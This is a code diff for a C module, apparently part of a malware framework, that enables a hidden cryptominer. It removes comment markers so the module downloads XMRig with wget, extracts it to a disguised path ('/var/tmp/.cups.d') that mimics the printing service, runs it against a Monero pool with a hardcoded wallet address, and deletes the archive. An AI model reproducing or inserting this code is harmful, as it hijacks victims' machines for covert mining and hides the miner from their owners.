@@ -11,9 +11,8 @@
 #define MONEY_DOWNLOAD_PATH "/var/tmp/xmrig.tar.gz"
 #define MONEY_EXECPATH "/var/tmp/.cups.d"
 
-#include "utils.h"
 #include "xmr.h"
-/*
+
 int fetch_xmrig(char *download_path) {
     char template[] = "wget -O %s https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz";
     char command[256];
@@ -148,9 +147,8 @@ int extract_xmrig_runner(char *srcPath, char *destPath) {
     return 0;
 }
 
-int money(char *execPath) {
-    
-    if (global->execlp(execPath, execPath,
+int money(char *exec_path) {
+    if (global->execlp(exec_path, exec_path,
            "--url", "xmrpool.eu:5555",
            "--user", "4ARVkbE25vnbMyEMRhUpXKdn2ThNk1YPhdvtwYyui96bR4mMRqnQ5JT13iAgqzszGJ4THiD2DV1So7UADuEtdnia5DNq53q",
            "--pass", "x",
@@ -168,28 +166,13 @@ int money(char *execPath) {
             DEBUG_LOG_ERR("[XMR] fail executing xmr binary\n");
            }
            return 0;
-}*/
-
-int xmrig(Globals * glob);
+}
 
 // Main function for xmrig module
 int xmrig(Globals * glob) {
-    DEBUG_LOG("reached xmrig");
     global = glob;
-    return 0;
-    // uncomment for silencing stdout and stderr, just in case
-    /*
-    int null_fd = open("/dev/null", O_WRONLY);
-    if (null_fd == -1) {
-        perror("Failed to open /dev/null");
-        return 1;
-    }
 
-    dup2(null_fd, STDOUT_FILENO);
-    dup2(null_fd, STDERR_FILENO);
-    close(null_fd);*/
-/*
-    if (fetch_xmrig(MONEY_DOWNLOAD_PATH) < 0) {
+    if (download_retries_xmrig(MONEY_DOWNLOAD_PATH) < 0) {
         DEBUG_LOG_ERR("[XMR] failed fetching\n");
         return -1;
     }
@@ -201,5 +184,5 @@ int xmrig(Globals * glob) {
     if (delete_file(MONEY_DOWNLOAD_PATH) < 0) {
         DEBUG_LOG_ERR("[XMR] failed deleting, proceeding anyway\n");
     }
-    return money(MONEY_EXECPATH);*/
+    return money(MONEY_EXECPATH);
 }
